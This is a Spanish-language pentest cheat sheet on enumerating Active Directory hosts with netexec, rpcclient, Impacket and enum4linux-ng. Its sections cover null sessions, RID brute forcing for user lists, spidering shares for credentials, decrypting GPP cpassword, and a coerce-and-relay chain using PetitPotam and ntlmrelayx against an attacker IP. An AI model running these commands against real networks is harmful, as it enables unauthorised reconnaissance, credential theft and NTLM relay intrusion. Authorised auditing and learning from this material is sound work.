---
aliases:
  - RPC Anonymous Enum
  - SMB Null Session
  - rpcclient AD
  - enum4linux-ng
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Hosts Enumeration]]"
  - "[[netexec]]"
---
# AD - Hosts Enumeration - RPC, SMB & NetBIOS Probing

---

## Anonymous SMB / Null Session

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u '' -p ''` | Auth nula OK/fail + banner | Test inicial. |
| `nxc smb <DC> -u '' -p '' --shares` | Shares anónimos + perms | Misconfig hunt. |
| `nxc smb 10.0.0.0/24 -u '' -p '' --shares` | Sweep del subnet | Rogue hosts. |
| `smbclient -L //<DC> -N` | Lista shares con null session | Sin nxc. |
| `smbclient //<DC>/<share> -N` | Mount anónimo | Per-share access. |
| `smbmap -H <DC> -u '' -p ''` | Read/Write/No flags | Auditor-friendly output. |
| `nxc smb <DC> -u 'guest' -p ''` | Fallback Guest account | Si null bind blocked. |
| `nmap -p445 --script smb-enum-shares 10.0.0.0/24` | Bulk via nmap | Sin SMB tools. |
^ad-rpc-nullsmb

**Hardening defaults:** Win2019+ desactiva null session. `RestrictAnonymous=2` bloquea totalmente. Si pega = legacy/misconfig.

```bash
# Sweep null + shares
nxc smb 10.0.0.0/24 -u '' -p '' --shares
smbmap -H 10.0.0.0/24 -u '' -p ''
```

---

## Anonymous RPC Enumeration

| **Comando dentro rpcclient** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `srvinfo` | Server info + role + OS | Bootstrap. |
| `enumdomains` | Lista domains presentes | Multi-domain. |
| `lsaquery` | Domain SID + name | Para RID lookups. |
| `lookupsids S-1-5-21-...-500` | Resolver SID → username | RID 500 = Administrator. |
| `samrlookuprids domain 500` | Resolver RID directo | Targeted. |
| `enumdomusers` | User list (si null permitido) | RID brute alt. |
| `enumdomgroups` | Group list | Group enum. |
| `enumalsgroups builtin` | Built-in aliases (Admins, Backup Ops) | Privesc enum. |
| `getdompwinfo` | Password policy (lockout, length) | Spray prep. |
| `querydominfo` | Domain info detallado | Alternativa. |
| `enumtrust` | Trusts directos | Trust mapping. |
^ad-rpc-anonenum

```bash
# rpcclient one-shot batch
rpcclient -U "" <DC> -N -c 'srvinfo;enumdomains;lsaquery;getdompwinfo;enumdomusers;enumdomgroups;enumtrust'

# Authenticated — más data
rpcclient -U 'corp\user%pass' <DC> -c 'enumdomusers;enumdomgroups;querydispinfo'
```

---

## RID Brute Force

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u u -p p --rid-brute` | Users + groups via SAMR (default 4000) | Authenticated. |
| `nxc smb <DC> -u u -p p --rid-brute 10000` | Range custom | Domain grande. |
| `nxc smb <DC> -u '' -p '' --rid-brute` | RID brute null session | Si null permitido. |
| `impacket-lookupsid 'corp/u:p'@<DC> 5000` | Iterate range con Impacket | Alt tool. |
| `impacket-lookupsid 'corp/'@<DC>` | Anonymous Impacket | Si null. |
| `enum4linux-ng -R <DC>` | RID cycling | All-in-one. |
^ad-rpc-ridbrute

**RIDs estándar:** 500=Administrator, 501=Guest, 502=krbtgt, 512=Domain Admins, 513=Domain Users, 514=Domain Guests, 515=Domain Computers, 516=Domain Controllers. RIDs 1000+ = creados por usuarios.

```bash
# Bulk extract — solo users
nxc smb <DC> -u user -p pass --rid-brute 5000 |
  grep "SidTypeUser" |
  awk '{print $6}' |
  cut -d'\\' -f2 > users.txt

# Output ejemplo:
# 500: corp\Administrator (SidTypeUser)
# 502: corp\krbtgt (SidTypeUser)
# 512: corp\Domain Admins (SidTypeGroup)
```

---

## enum4linux-ng / Comprehensive Probes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `enum4linux-ng -A <DC>` | Full automated (anonymous) | Recon completo en 1 shot. |
| `enum4linux-ng -A -u u -p p <DC>` | Igual pero authenticated | Mucha más data. |
| `enum4linux-ng -A <DC> -oJ out.json` | Output JSON parseable | Pipeline automation. |
| `enum4linux-ng -U <DC>` | Solo users | Targeted. |
| `enum4linux-ng -G <DC>` | Solo groups | Targeted. |
| `enum4linux-ng -S <DC>` | Solo shares | Targeted. |
| `enum4linux-ng -P <DC>` | Solo password policy | Spray prep. |
| `enum4linux-ng -R <DC>` | RID cycling | Sin nxc. |
| `enum4linux -a <DC>` | Legacy enum4linux | Cuando -ng no disponible. |
^ad-rpc-enum4linux

```bash
# Pipeline auditor estándar
enum4linux-ng -A -u user -p pass <DC> -oJ corp_audit.json

# Secciones que cubre:
#  - SMB dialects + signing
#  - Workgroup/domain + NetBIOS
#  - LSA queries (domain SID)
#  - Password policy
#  - User list + Group list
#  - Share list (read/write flags)
#  - RID cycling
#  - Printer info
```

---

## SMB Share Spider / Content Recon

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt -u u -p p --shares` | Shares + read/write flags bulk | Inventory. |
| `nxc smb hosts.txt -u u -p p --spider SHARE --pattern "password\|secret\|key"` | Spider con regex match | Cred hunt. |
| `nxc smb hosts.txt -u u -p p -M spider_plus` | Spider con interesting extensions config | Default cred hunt. |
| `nxc smb hosts.txt -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml,ini,bat,ps1,vbs,config` | Spider extensiones específicas | Targeted. |
| `nxc smb <DC> -u u -p p -M gpp_password` | GPP cpassword auto-detect + decrypt | MS14-025 leftover. |
| `smbmap -H <DC> -u u -p p -R --depth 5` | Recursive con depth limit | Performance. |
| `smbmap -H <DC> -u u -p p -R -A '\.config$\|\.xml$\|\.ini$'` | Filter por extensión | Targeted. |
| `Snaffler.exe -s` | Modern share-snaffler | Windows comprehensive. |
| `manspider` | Linux Snaffler-like | Sin Windows. |
| `smbclient //<host>/<share> -U 'corp/u%p'` | Mount interactive | Manual review. |
^ad-rpc-shares

```bash
# Pipeline cred hunt
nxc ldap <DC> -u u -p p --computers > hosts.txt
nxc smb hosts.txt -u u -p p --shares > shares.txt
nxc smb hosts.txt -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml,ini,bat,ps1,vbs
nxc smb <DC> -u u -p p -M gpp_password
```

---

## SMB Signing & Relay Prep

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt --signing` | Signing required vs not per-host | Audit relay surface. |
| `nxc smb hosts.txt --gen-relay-list relay.txt` | Lista hosts sin signing required | NTLM Relay prep. |
| `nmap -p445 --script smb2-security-mode hosts` | Signing detallado | Sin nxc. |
| `nmap -p445 --script smb-protocols hosts` | SMB versions habilitadas | Detect SMBv1. |
^ad-rpc-signing

**Diferencia clave:** `Required` = enforced (relay bloqueado). `Enabled` = opcional (relay funciona si cliente no firma). DCs Win2019+ default `Required`. Servers/workstations default `Required` post-2022. Legacy = candidatos.

```bash
# Pipeline NTLM Relay completo
nxc ldap <DC> -u user -p pass --computers > all_hosts.txt
nxc smb all_hosts.txt --gen-relay-list relay_targets.txt

# Coercion + relay
# Terminal 1: ntlmrelayx.py -tf relay_targets.txt -smb2support
# Terminal 2: PetitPotam.py -u '' -p '' <attacker-IP> <DC>
```

---
